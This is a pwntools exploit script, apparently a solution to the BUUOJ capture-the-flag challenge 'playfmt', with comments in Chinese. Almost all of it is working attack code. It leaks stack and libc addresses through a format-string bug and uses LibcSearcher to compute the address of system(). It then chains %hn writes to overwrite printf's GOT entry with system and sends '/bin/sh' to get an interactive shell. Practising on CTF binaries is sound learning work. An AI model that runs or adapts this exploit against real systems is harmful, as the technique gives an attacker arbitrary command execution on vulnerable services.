from pwn import*
from LibcSearcher import *
p   = process('./playfmt')
#p   = remote('node4.buuoj.cn', 28514)
elf = ELF('./playfmt')

printf_got  = elf.got['printf']

p.recvline()
p.recvline()
p.recvline()

# 获取栈地址和libc地址
payload = b'%6$p%43$p'
p.send(payload)
do_fmt_ebp      = int(p.recv(10), 16)
libc_start_main = int(p.recv(10), 16) - 147
# 计算出libc的基地址和system地址
libc = LibcSearcher('__libc_start_main', libc_start_main)
libc_base   = libc_start_main - libc.dump('__libc_start_main')
system      = libc_base + libc.dump('system')
#libc = ELF('./libc-2.23.so')
#libc_base   = libc_start_main - libc.symbols['__libc_start_main']
#system      = libc_base + libc.symbols['system']

# 寻找一个指向.text段的栈地址
stack1 = do_fmt_ebp - 0xC
# 设置一个可以指向这个栈地址的地址
playload1 = b'%' + bytes(str(stack1 & 0xffff).encode()) + b'c%6$hn' + b'aaaa'
p.send(playload1)
p.recvuntil('aaaa')
# 设置这个地址的值指向printf_got
playload2 = b'%' + bytes(str(printf_got & 0xffff).encode()) + b'c%10$hn' + b'aaaa'
p.send(playload2)
p.recvuntil('aaaa')

# 寻找一个指向.text段的栈地址
stack2 = do_fmt_ebp + 0x4
# 设置一个可以指向这个栈地址的地址
playload1 = b'%' + bytes(str(stack2 & 0xffff).encode()) + b'c%6$hn' + b'aaaa'
p.send(playload1)
p.recvuntil('aaaa')
# 设置这个地址的值指向printf_got
playload2 = b'%' + bytes(str((printf_got + 2) & 0xffff).encode()) + b'c%10$hn' + b'aaaa'
p.send(playload2)
p.recvuntil('aaaa')

# 修改printf_got为system
# 先写一个字节
# 再写两个字节
payload = b'%' + bytes(str(  (system>>16) & 0xff).encode() ) + b'c%11$hhn'
payload += b'%' + bytes(str( (system&0xffff) - ((system>>16) & 0xff) ).encode()) + b'c%7$hn' + b'aaaa'

p.sendline(payload)
p.recvuntil('aaaa')

p.send('/bin/sh\x00')
p.interactive()
